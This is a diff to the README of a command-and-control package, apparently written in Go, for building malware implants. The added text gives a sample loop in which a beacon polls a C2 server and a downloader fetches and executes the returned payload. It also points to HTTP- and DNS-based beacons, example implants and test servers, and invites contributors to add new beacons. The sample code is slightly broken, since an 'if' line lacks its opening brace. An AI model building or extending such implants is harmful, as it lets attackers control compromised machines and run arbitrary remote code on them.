@@ -1,11 +1,29 @@
 # C2
-The C2 package provides beacons and downloaders that can be used in implants. The beacons and downloaders are designed to work together but can be used separately.
+The C2 package provides beacons and downloaders that can be used in implants. The beacons and downloaders are designed to work together but can be used separately. The code below shows a sample work flow. You can find more detailed examples in the examples directory.
 
-## Usage
-To use the C2 package, first, import the beacon and/or downloader package. Next, create a new beacon, which will ping the given C2 server. When the server is ready to activate the beacon it should respond with the URL of the file that should be downloaded and executed. If desired, create a new downloader, which takes a URL and download and executes file at the URL.
+    beacon := beacon.NewBeacon()
+    downloader := downloader.NewDownloader()
 
-## Examples
-Check the examples folder for detailed examples, including an HTTP server that can be used for testing the examples.
+    for {
+        str := beacon.Ping()
 
-## Custom Beacons and Downloaders
-You can create your own beacons and downloaders by creating a struct that satisfies the appropriate interface.
+        if str != ""
+            downloader.DownloadExec(str)
+        }
+
+        time.Sleep(sleep * time.Second)
+    }
+
+Each beacon must define a Ping() method, which returns a string that tells the DownloadExec() where to find the payload. If the Ping() method returns an empty string then DownloadExec() is not called.
+
+## Creating Implants
+The examples folder has two implants to use as a reference for building your own implants. The general idea is to select a beacon and a downloader and wrap them in a loop with some type of timing mechanism to control how often the implant will ping out.
+
+## Creating Beacons and Downloaders
+To create new beacons and downloaders you must build a struct that satisfies the appropriate interface. The beacon and downloader directories contain both HTTP and DNS based examples.
+
+## Testing
+The examples directory contains a DNS server and an HTTP server that can be used to test the various beacons and downloaders. There is also a test file in the beacon and downloader directories that can be used with the `go test` command to test the current beacons and downloaders.
+
+## Contributions
+I would love to have folks submit new beacons and downloaders. If you submit a new beacon or downloader also submit code or a written procedure that can be used to test the new method.
